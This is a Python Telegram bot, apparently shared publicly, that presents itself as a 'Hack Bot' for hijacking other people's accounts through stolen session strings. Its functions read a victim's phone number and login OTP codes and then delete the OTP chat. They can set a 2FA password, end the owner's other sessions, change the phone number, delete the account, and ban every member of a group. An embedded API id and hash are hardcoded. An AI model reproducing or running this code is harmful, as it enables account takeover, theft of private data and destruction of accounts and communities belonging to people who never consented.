
# COPYRIGHT © 2022 BY TeamIndia 🔥
# NOW PUBLIC BY BLAZE
import os
os.system("pip install Telethon==1.21.1")
from telethon import TelegramClient, events, functions, types
api_id = os.environ.get("APP_ID")
import os, asyncio
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('TeamIndia', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

BLAZE = 5220412704


async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    try:
      await X.edit_2fa('SHIELD')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 3898418, "5a82313211da04d63297bd4de436228c") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "IndianSupportGroup"
menu = '''
**NOTICE JOIN @OfficialShield FEDERATION**
FED ID `8cc66baa-415a-4c85-8e93-75cd7fab4fef`
1: [check user own groups and channels]
2: [check user all information like phone number usrname...]
3: [ban a group {give me StringSession and channel/group username i will ban all members there}]
4: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
5: [Join A Group/Channel via StringSession]
6: [Leave A Group/Channel via StringSession]
7: [Delete A Group/Channel]
8: [Check user two step is eneable or disable]
9: [Terminate All current active sessions except Your StringSession]
10: [Delete Account]
11: [Demote all admins in a group/channel]
12: [Promote a member in a group/channel]
13: [Change Phone number using StringSession]
Soon I am adding More Features!
'''
mm = '''
You can hack anybody
Take his StringSession and use me
I will give you full power of mine
Type /hack
'''
@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    await event.reply("please use me in pm🥺")
  else:
    await event.reply(mm)
@client.on(events.NewMessage(pattern="/give"))
async def op(event):
  if not event.sender_id == SHIELD:
    return await event.reply("please don't use me fuck off 🥺")
  try:
    await event.reply("session bot file", file="TeamShield.session")
  except Exception as e:
    print (e)


@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  await event.reply("please use me in pm🥺")
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"Choose what you want with string session \n\n{menu}")
    res = await x.get_response()
    r = res.text
    if res.text == "1":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("This StringSession is terminated maybe")
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDETAILS BY TeamIndia")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nThanks For using  Bot")
    elif res.text == "2":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      i = await userinfo(strses.text)
      await event.reply(i + "\n\nThanks For using Hack Bot")
    elif r == "3":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("Banning all members Thanks For using Hack Bot")
    elif r == "4":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nThanks For using Hack Bot")
    elif r == "5":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await event.reply("Joined the Channel/Group Thanks For using ")
    elif r == "6":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await event.reply("Leaved the Channel/Group Thanks For using Hack Bot")
    elif r == "7":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("Deleted the Channel/Group Thanks For using Hack Bot")
    elif r == "8":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      i = await user2fa(strses.text)
      if i:
        await event.reply("User don't have two step thats why now two step is `SHIELDISBEST` you can login now\n\nThanks For using Hack Bot")
      else:
        await event.reply("Sorry User Have two step already")
    elif r == "9":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      i = await terminate(strses.text)
      await event.reply("The all sessions are terminated\n\nThanks For using Hack Bot")
    elif res.text == "10":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      i = await delacc(strses.text)
      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using Hack Bot")
    elif res.text == "11":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
      grp = await x.get_response()
      await x.send_message("NOW GIVE USER USERNAME")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using Hack Bot")
    elif res.text == "12":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using Hack Bot")
    elif res.text == "13":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
        await asyncio.sleep(20)
        await x.send_message("NOW GIVE PHONE CODE HASH")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("NOW GIVE THE OTP")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
        else:
          await event.respond("Something is wrong")
      except Exception as e:
        await event.respond("SEND THIS ERROR TO - @IndianSupportGroup\n**LOGS**\n" + str(e))

    else:
      await event.respond("Wrong Text Found Re type /hack and use")





client.run_until_disconnected()